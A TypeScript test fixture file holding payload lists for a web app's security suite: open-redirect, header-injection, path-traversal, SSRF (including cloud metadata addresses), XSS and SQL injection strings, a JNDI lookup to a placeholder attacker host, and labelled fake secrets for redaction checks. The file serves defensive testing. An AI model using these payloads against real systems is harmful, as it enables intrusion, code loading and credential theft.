/**
 * Shared adversarial corpora for the security suite.
 *
 * These exist so a payload discovered once is tested everywhere it could apply,
 * instead of each test growing its own ad-hoc list and quietly missing the case
 * that actually matters. Every value here is synthetic; nothing is derived from
 * a real credential, host, account or deployment.
 *
 * When a new bypass is found, add it HERE. The suites that consume these arrays
 * pick it up without being edited, which is the point.
 */

/** Hosts an attacker would supply to a redirect, a link builder or an allowlist. */
export const HOSTILE_DESTINATIONS: readonly string[] = Object.freeze([
  // Protocol-relative and absolute
  "//evil.example",
  "///evil.example",
  "////evil.example",
  "https://evil.example",
  "http://evil.example",
  "HtTpS://evil.example",
  // Non-HTTP schemes
  "javascript:alert(1)",
  "JaVaScRiPt:alert(1)",
  "data:text/html,<script>alert(1)</script>",
  "vbscript:msgbox(1)",
  "file:///etc/passwd",
  "blob:https://evil.example/x",
  "ftp://evil.example",
  // Backslash confusion
  "\\\\evil.example",
  "/\\evil.example",
  "\\/evil.example",
  "https:/\\evil.example",
  "/\\/evil.example",
  // Encoding, single through triple
  "%2F%2Fevil.example",
  "%252F%252Fevil.example",
  "%25252F%25252Fevil.example",
  "/%5C%5Cevil.example",
  "%5C%5Cevil.example",
  "%68%74%74%70%73%3A%2F%2Fevil.example",
  // Unicode slash and space lookalikes
  "\u2044\u2044evil.example",
  "\uFF0F\uFF0Fevil.example",
  "\u29F8\u29F8evil.example",
  "/\u0085/evil.example",
  "/\u2028/evil.example",
  "/\u00A0/evil.example",
  // Control characters
  "/\r\nLocation: https://evil.example",
  "/\nSet-Cookie: a=b",
  "/\tevil",
  "/\u0000/evil",
  "/\u000B/evil",
  // Userinfo confusion
  "https://mathnexa.com@evil.example",
  "https://mathnexa.com:pass@evil.example",
  "//mathnexa.com@evil.example",
  // Suffix and prefix lookalikes
  "https://mathnexa.com.evil.example",
  "https://evil.example/mathnexa.com",
  "https://mathnexa.com.",
  "https://xn--mathnexa-example.example",
  // Traversal against an allowlist
  "/../../evil",
  "/games/../../evil",
  "/teacher/../admin",
  "/./games",
  // Query and fragment smuggling
  "/games?next=https://evil.example",
  "/games#@evil.example",
  "/games#https://evil.example",
  "/?redirect=//evil.example",
  // Whitespace and case variants of legitimate values
  " /games",
  "/games ",
  "/GAMES",
  // Length
  `/${"a".repeat(4096)}`
]);

/**
 * Values aimed at a response header. A header value must never be able to carry
 * a line break, close a quoted parameter early, or introduce a second header.
 */
export const HEADER_INJECTION_PAYLOADS: readonly string[] = Object.freeze([
  'report".pdf',
  'a"; filename="evil.exe',
  "report\r\nX-Injected: yes",
  "report\r\n\r\n<script>alert(1)</script>",
  'x"\r\nSet-Cookie: session=stolen',
  "back\\slash.pdf",
  "line\nbreak.pdf",
  "carriage\rreturn.pdf",
  "vertical\u000Btab.pdf",
  "form\u000Cfeed.pdf",
  "unicode\u2028separator.pdf",
  "unicode\u2029paragraph.pdf",
  "null\u0000byte.pdf",
  "../../etc/passwd",
  "..\\..\\windows\\system32",
  `${"x".repeat(9000)}.pdf`
]);

/** Path segments aimed at anything that resolves to a file or storage object. */
export const PATH_TRAVERSAL_PAYLOADS: readonly string[] = Object.freeze([
  "../secret",
  "../../secret",
  "..\\secret",
  "..\\..\\secret",
  "%2e%2e/secret",
  "%2e%2e%2fsecret",
  "%252e%252e%252fsecret",
  "..%c0%afsecret",
  "..%255c secret",
  "....//secret",
  "..;/secret",
  "/etc/passwd",
  "C:\\Windows\\System32\\config\\sam",
  "\\\\server\\share",
  "file:///etc/passwd",
  "index.html/../../.env",
  "\u0000.env",
  "sub/../../../.env",
  `${"../".repeat(64)}etc/passwd`
]);

/**
 * Hosts that must never be reachable by a server-side fetch whose destination is
 * influenced by input. Cloud metadata and loopback are the ones that turn an
 * SSRF into a credential disclosure.
 */
export const SSRF_TARGETS: readonly string[] = Object.freeze([
  "http://localhost/",
  "http://localhost:3000/",
  "http://127.0.0.1/",
  "http://127.1/",
  "http://0.0.0.0/",
  "http://[::1]/",
  "http://[::ffff:127.0.0.1]/",
  // Cloud instance metadata
  "http://169.254.169.254/latest/meta-data/",
  "http://metadata.google.internal/",
  "http://[fd00:ec2::254]/",
  // RFC1918
  "http://10.0.0.1/",
  "http://172.16.0.1/",
  "http://192.168.1.1/",
  // Alternate encodings of 127.0.0.1
  "http://2130706433/",
  "http://0x7f000001/",
  "http://0177.0.0.1/",
  "http://127.0.0.1.nip.io/",
  // Userinfo and trailing dot
  "http://evil.example@127.0.0.1/",
  "http://localhost./",
  // Non-HTTP schemes
  "file:///etc/passwd",
  "gopher://127.0.0.1:6379/_INFO",
  "dict://127.0.0.1:11211/stat",
  "ftp://127.0.0.1/"
]);

/** Rendering payloads, for any surface that could put input into a document. */
export const XSS_PAYLOADS: readonly string[] = Object.freeze([
  "<script>alert(1)</script>",
  "<img src=x onerror=alert(1)>",
  "<svg onload=alert(1)>",
  "<iframe src=javascript:alert(1)>",
  "\"><script>alert(1)</script>",
  "'><script>alert(1)</script>",
  "</textarea><script>alert(1)</script>",
  "</script><script>alert(1)</script>",
  "javascript:alert(1)",
  "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
  "&lt;script&gt;alert(1)&lt;/script&gt;",
  "&#60;script&#62;alert(1)&#60;/script&#62;",
  "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
  "<style>@import'javascript:alert(1)'</style>",
  "${alert(1)}",
  "{{constructor.constructor('alert(1)')()}}",
  "<body onpageshow=alert(1)>",
  "<details open ontoggle=alert(1)>"
]);

/**
 * Environment-flag spellings.
 *
 * MN-09 was exactly this: a boolean flag carrying a trailing newline read as
 * "not set", silently disabling the staging gate. Anything that parses a
 * security-relevant environment boolean should be tested against all of these.
 */
export const ENVIRONMENT_BOOLEAN_VARIANTS: readonly string[] = Object.freeze([
  "true", " true ", "true\n", "true\r\n", "\ttrue\r\n", "\n\ntrue\n\n", "TRUE", "True", "tRuE",
  "false", " false ", "false\n", "FALSE", "False",
  "yes", "no", "1", "0", "on", "off", "y", "n",
  "tru", "trueXYZ", "false-ish", "truthy", "enabled", "disabled",
  "null", "undefined", "", " ", "\n", "\t", "-"
]);

/**
 * Values a caller might supply where an opaque identifier is expected. Anything
 * that reaches a database or a storage path should reject all of these before
 * the query is built.
 */
export const HOSTILE_IDENTIFIERS: readonly string[] = Object.freeze([
  "",
  " ",
  "*",
  "%",
  "_",
  "1 OR 1=1",
  "' OR '1'='1",
  "'; DROP TABLE users; --",
  "00000000-0000-0000-0000-000000000000\u0000",
  "../00000000-0000-4000-8000-000000000000",
  "00000000-0000-4000-8000-000000000000/../../etc",
  "${jndi:ldap://evil.example/a}",
  "{{7*7}}",
  "\u202Egnp.exe",
  `${"a".repeat(10000)}`,
  "null",
  "undefined",
  "[object Object]",
  "__proto__",
  "constructor"
]);

/**
 * Deliberately fake secret-shaped values, used to prove redaction.
 *
 * None of these is real, and none resembles a real MathNexa credential beyond
 * its general shape — that is deliberate, so a leak of one of these in a log or
 * a bundle is unambiguous evidence of a redaction failure rather than an actual
 * secret.
 */
export const FAKE_SECRETS: Readonly<Record<string, string>> = Object.freeze({
  password: "not-a-real-password-9f2c",
  sessionCookie: "sb-access-token=fake-session-value-4c7a",
  accessToken: "fake-access-token-0b1d",
  refreshToken: "fake-refresh-token-77aa",
  authorizationHeader: "Bearer fake-bearer-credential-31fe",
  schoolAccessCode: "FAKECODE1234",
  stagingToken: "F".repeat(43),
  supabaseSecret: "sb_secret_fake_value_for_redaction_testing",
  stripeSecret: "sk_test_fakevalueforredactiontesting00",
  webhookSecret: "whsec_fakevalueforredactiontesting00",
  csrfSecret: "fake-csrf-secret-value-for-testing-only",
  privateKey: "-----BEGIN PRIVATE KEY-----FAKE-----END PRIVATE KEY-----"
});

/** Every fake secret value, for "must not appear anywhere" assertions. */
export const FAKE_SECRET_VALUES: readonly string[] = Object.freeze(Object.values(FAKE_SECRETS));
